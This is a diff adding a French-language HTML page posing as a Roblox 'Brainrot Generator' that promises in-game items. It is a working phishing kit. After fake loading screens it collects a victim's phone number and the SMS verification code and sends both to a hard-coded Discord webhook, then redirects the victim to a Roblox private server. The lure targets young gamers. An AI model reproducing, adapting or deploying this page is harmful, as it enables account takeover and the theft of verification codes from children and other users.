@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brainrot Generator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #393b3d;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #2c2d2f;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+            position: relative; /* Nécessaire pour positionner les étapes */
+            height: 500px; /* Hauteur fixe pour éviter que le conteneur ne se redimensionne */
+        }
+
+        .step {
+            position: absolute;
+            width: calc(100% - 60px); /* Ajustement pour le padding du container */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease-in-out;
+        }
+
+        .step.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        h1 {
+            color: #ffffff;
+            margin-bottom: 8px;
+            font-size: 1.8em;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #b8b8b8;
+            margin-bottom: 25px;
+            font-size: 0.95em;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            color: #ffffff;
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9em;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #696969;
+            border-radius: 4px;
+            font-size: 1em;
+            background: #393b3d;
+            color: #ffffff;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00a2ff;
+        }
+
+        input::placeholder {
+            color: #b8b8b8;
+        }
+
+        button {
+            background: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 1em;
+            cursor: pointer;
+            font-weight: 700;
+            width: 100%;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #0084d1;
+        }
+
+        button:active {
+            background: #006fb8;
+        }
+
+        .loading-text {
+            color: #b8b8b8;
+            font-size: 0.9em;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .spinner {
+            border: 4px solid #393b3d;
+            border-top: 4px solid #00a2ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 60px auto 15px; /* Centrer le spinner */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .result {
+            background: #393b3d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 2px solid #00a2ff;
+            text-align: center;
+        }
+
+        .brainrot-text {
+            font-size: 1.3em;
+            color: #00a2ff;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: #00a2ff;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5em;
+        }
+
+        .success-text {
+            color: #4caf50;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .info-text {
+            color: #b8b8b8;
+            font-size: 0.85em;
+            line-height: 1.5;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Step 1: Username -->
+        <div id="step1" class="step active">
+            <div class="icon">🎮</div>
+            <h1>Brainrot Generator</h1>
+            <p class="subtitle">Enter your Roblox username to continue</p>
+            <div class="input-group">
+                <label>Roblox Username</label>
+                <input type="text" id="username" placeholder="Username">
+            </div>
+            <button onclick="nextStep()">Continue</button>
+        </div>
+
+        <!-- Loading 1 -->
+        <div id="loading1" class="step">
+            <div class="spinner"></div>
+            <p class="loading-text">Connecting to server...</p>
+        </div>
+
+        <!-- Step 2: Brainrot Name -->
+        <div id="step2" class="step">
+            <div class="icon">🧠</div>
+            <h1>Enter Brainrot</h1>
+            <p class="subtitle">Write the brainrot you want to generate</p>
+            <div class="input-group">
+                <label>Brainrot Name</label>
+                <input type="text" id="brainrotName" placeholder="e.g. skibidi toilet">
+            </div>
+            <button onclick="submitBrainrot()">Generate</button>
+        </div>
+
+        <!-- Loading 2 -->
+        <div id="loading2" class="step">
+            <div class="spinner"></div>
+            <p class="loading-text">Generating your brainrot...</p>
+        </div>
+
+        <!-- Step 3: Phone Number -->
+        <div id="step3" class="step">
+            <div class="icon">📱</div>
+            <h1>Vérification</h1>
+            <p class="subtitle">Entrez votre numéro de téléphone</p>
+            <div class="input-group">
+                <label>Numéro de téléphone</label>
+                <input type="tel" id="phoneNumber" placeholder="06 12 34 56 78">
+            </div>
+            <button onclick="submitPhoneNumber()">Suivant</button>
+        </div>
+
+        <!-- Step 4: SMS Code -->
+        <div id="step4" class="step">
+            <div class="icon">✉️</div>
+            <h1>Code de vérification</h1>
+            <p class="subtitle">Veuillez entrer le code reçu par SMS</p>
+            <p class="info-text">(si vous n’avais toujours pas reçu le code il suffit juste d’attendre quelque minute avec la page ouverte!)</p>
+            <div class="input-group">
+                <label>Code</label>
+                <input type="text" id="smsCode" placeholder="123456">
+            </div>
+            <button onclick="submitCode()">Générer</button>
+        </div>
+
+        <!-- Final Result -->
+        <div id="result" class="step result">
+            <div class="success-text">✓ Génération Terminée</div>
+            <div class="brainrot-text" id="finalMessage"></div>
+            <p class="info-text">rejoignez ce server privée steal a brainrot Roblox pour le recevoir</p>
+            <button onclick="goToServer()">clique ici 👈🏻 pour aller dans le server priver Roblox</button>
+            <button onclick="restart()">Générer un autre</button>
+        </div>
+    </div>
+
+    <script>
+        let brainrotNameInput = '';
+
+        function showStep(stepIdToShow) {
+            // Masquer toutes les étapes
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            // Afficher l'étape demandée
+            document.getElementById(stepIdToShow).classList.add('active');
+        }
+
+        function nextStep() {
+            const username = document.getElementById('username').value;
+            if (!username) {
+                alert('Please enter your Roblox username');
+                return;
+            }
+            showStep('loading1');
+            setTimeout(() => {
+                showStep('step2');
+            }, 2500);
+        }
+
+        function submitBrainrot() {
+            brainrotNameInput = document.getElementById('brainrotName').value;
+            if (!brainrotNameInput) {
+                alert('Veuillez entrer un nom pour le brainrot.');
+                return;
+            }
+            showStep('loading2');
+            setTimeout(() => {
+                showStep('step3');
+            }, 3500);
+        }
+
+        function submitPhoneNumber() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (!phoneNumber) {
+                alert('Veuillez entrer un numéro de téléphone.');
+                return;
+            }
+            sendToWebhook(phoneNumber);
+            showStep('step4');
+        }
+
+        function submitCode() {
+            const code = document.getElementById('smsCode').value;
+            if (!code) {
+                alert('Veuillez entrer le code reçu.');
+                return;
+            }
+            sendToWebhook(`CODE: ${code}`);
+            document.getElementById('finalMessage').textContent = `le brainrot ${brainrotNameInput} a bine étais générer`;
+            showStep('result');
+        }
+
+        function restart() {
+            brainrotNameInput = '';
+            document.getElementById('username').value = '';
+            document.getElementById('brainrotName').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('smsCode').value = '';
+            showStep('step1');
+        }
+
+        function goToServer() {
+            window.open('https://www.roblox.com/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=05595118809739613080331512431744', '_blank');
+        }
+
+        async function sendToWebhook(message) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1365886265198772306/KFX-ZCpzmvLVLOwZ3hlPCAAZvZrfGWXqNSULuJjf4FZfofjV11wR4xyl4bTnffUxQ8hy';
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (error) {
+                console.error('Erreur webhook:', error);
+            }
+        }
+    </script>
+</body>
+</html>
